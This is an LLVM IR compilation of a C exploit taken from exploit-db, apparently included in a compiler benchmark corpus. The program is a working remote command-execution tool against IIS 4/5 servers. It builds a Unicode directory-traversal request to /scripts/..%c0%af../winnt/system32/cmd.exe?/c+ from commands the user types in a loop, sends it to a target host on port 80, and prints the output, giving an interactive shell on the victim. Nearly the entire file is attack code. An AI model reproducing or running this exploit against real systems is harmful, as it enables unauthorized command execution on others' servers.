; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_189.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_189.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [23 x i8] c"try %s www.server.com\0A\00", align 1
@.str.1 = private unnamed_addr constant [53 x i8] c"will let you play with cmd.exe of an IIS4/5 server.\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"by incubus <incubus@securax.org>\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [58 x i8] c"\0Aiisex - iis 4 and 5 exploit\0A---------------------------\0A\00", align 1
@.str.4 = private unnamed_addr constant [47 x i8] c"act like a cmd.exe kiddie, type quit to quit.\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"\0A[enter cmd> \00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"quit\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"Oops\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [51 x i8] c"GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c" HTTP/1.0\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [666 x i8], align 16
  %7 = alloca [500 x i8], align 16
  %8 = alloca [8192 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %24

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 @exit(i32 0) #4
  unreachable

24:                                               ; preds = %2
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.3, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0))
  br label %27

27:                                               ; preds = %97, %24
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  %29 = getelementptr inbounds [500 x i8], [500 x i8]* %7, i64 0, i64 0
  %30 = call i32 @gets(i8* %29)
  %31 = getelementptr inbounds [500 x i8], [500 x i8]* %7, i64 0, i64 0
  %32 = call i64 @strstr(i8* %31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %33 = icmp ne i64 %32, 0
  br i1 %33, label %34, label %36

34:                                               ; preds = %27
  %35 = call i32 @exit(i32 0) #4
  unreachable

36:                                               ; preds = %27
  store i32 0, i32* %9, align 4
  br label %37

37:                                               ; preds = %55, %36
  %38 = load i32, i32* %9, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [500 x i8], [500 x i8]* %7, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp ne i32 %42, 10
  br i1 %43, label %44, label %58

44:                                               ; preds = %37
  %45 = load i32, i32* %9, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [500 x i8], [500 x i8]* %7, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %51, label %55

51:                                               ; preds = %44
  %52 = load i32, i32* %9, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [500 x i8], [500 x i8]* %7, i64 0, i64 %53
  store i8 43, i8* %54, align 1
  br label %55

55:                                               ; preds = %51, %44
  %56 = load i32, i32* %9, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %9, align 4
  br label %37

58:                                               ; preds = %37
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call %struct.hostent* @gethostbyname(i8* %61)
  store %struct.hostent* %62, %struct.hostent** %13, align 8
  %63 = load %struct.hostent*, %struct.hostent** %13, align 8
  %64 = icmp ne %struct.hostent* %63, null
  br i1 %64, label %68, label %65

65:                                               ; preds = %58
  %66 = call i32 @herror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %67 = call i32 @exit(i32 -1) #4
  unreachable

68:                                               ; preds = %58
  %69 = load i32, i32* @AF_INET, align 4
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %69, i32* %70, align 4
  %71 = call i32 @htons(i32 80)
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i32 %71, i32* %72, align 4
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %74 = load %struct.hostent*, %struct.hostent** %13, align 8
  %75 = getelementptr inbounds %struct.hostent, %struct.hostent* %74, i32 0, i32 0
  %76 = load i64, i64* %75, align 8
  %77 = inttoptr i64 %76 to %struct.in_addr*
  %78 = bitcast %struct.in_addr* %73 to i8*
  %79 = bitcast %struct.in_addr* %77 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %78, i8* align 4 %79, i64 4, i1 false)
  %80 = load i32, i32* @AF_INET, align 4
  %81 = load i32, i32* @SOCK_STREAM, align 4
  %82 = call i32 @socket(i32 %80, i32 %81, i32 0)
  store i32 %82, i32* %10, align 4
  %83 = load i32, i32* %10, align 4
  %84 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %85 = call i32 @connect(i32 %83, %struct.sockaddr* %84, i32 12)
  store i32 %85, i32* %11, align 4
  %86 = load i32, i32* %11, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %91

88:                                               ; preds = %68
  %89 = call i32 @herror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %90 = call i32 @exit(i32 -1) #4
  unreachable

91:                                               ; preds = %68
  %92 = load i32, i32* %10, align 4
  %93 = icmp slt i32 %92, 0
  br i1 %93, label %94, label %97

94:                                               ; preds = %91
  %95 = call i32 @herror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %96 = call i32 @exit(i32 -1) #4
  unreachable

97:                                               ; preds = %91
  %98 = getelementptr inbounds [666 x i8], [666 x i8]* %6, i64 0, i64 0
  %99 = call i32 @strcpy(i8* %98, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.8, i64 0, i64 0))
  %100 = getelementptr inbounds [666 x i8], [666 x i8]* %6, i64 0, i64 0
  %101 = getelementptr inbounds [500 x i8], [500 x i8]* %7, i64 0, i64 0
  %102 = call i32 @strcat(i8* %100, i8* %101)
  %103 = getelementptr inbounds [666 x i8], [666 x i8]* %6, i64 0, i64 0
  %104 = call i32 @strcat(i8* %103, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0))
  %105 = load i32, i32* %10, align 4
  %106 = getelementptr inbounds [666 x i8], [666 x i8]* %6, i64 0, i64 0
  %107 = call i32 @send(i32 %105, i8* %106, i32 666, i32 0)
  %108 = load i32, i32* %10, align 4
  %109 = getelementptr inbounds [8192 x i8], [8192 x i8]* %8, i64 0, i64 0
  %110 = call i32 @recv(i32 %108, i8* %109, i32 8192, i32 0)
  %111 = getelementptr inbounds [8192 x i8], [8192 x i8]* %8, i64 0, i64 0
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* %111)
  %113 = load i32, i32* %10, align 4
  %114 = call i32 @close(i32 %113)
  br label %27
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @gets(i8*) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
